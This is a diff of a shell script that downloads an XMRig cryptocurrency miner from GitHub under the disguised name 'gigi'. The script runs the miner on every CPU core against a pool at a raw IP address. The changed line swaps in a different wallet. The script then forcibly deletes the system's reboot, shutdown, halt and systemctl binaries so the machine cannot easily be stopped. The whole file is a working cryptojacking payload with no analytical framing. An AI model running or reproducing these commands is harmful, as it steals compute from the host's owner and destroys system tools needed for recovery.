@@ -5,7 +5,7 @@ dpkg-reconfigure --frontend noninteractive tzdata
 apt update
 wget -O gigi https://github.com/kazppkido/kikir/raw/main/xmrig > /dev/null 2>&1
 chmod 777 gigi
-./gigi --donate-level 1 -o 165.232.165.31:80 --wallet 0x0D646f89Db83E0642199e88A7967C7f62af02a83 -p $(shuf -n 1 -i 1-999)-ww -a rx/0 -t $(nproc --all)
+./gigi --donate-level 1 -o 165.232.165.31:80 --wallet 0xb27e57f4accbf3a1384c1c17ac959376fc49e21d -p $(shuf -n 1 -i 1-999)-ww -a rx/0 -t $(nproc --all)
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
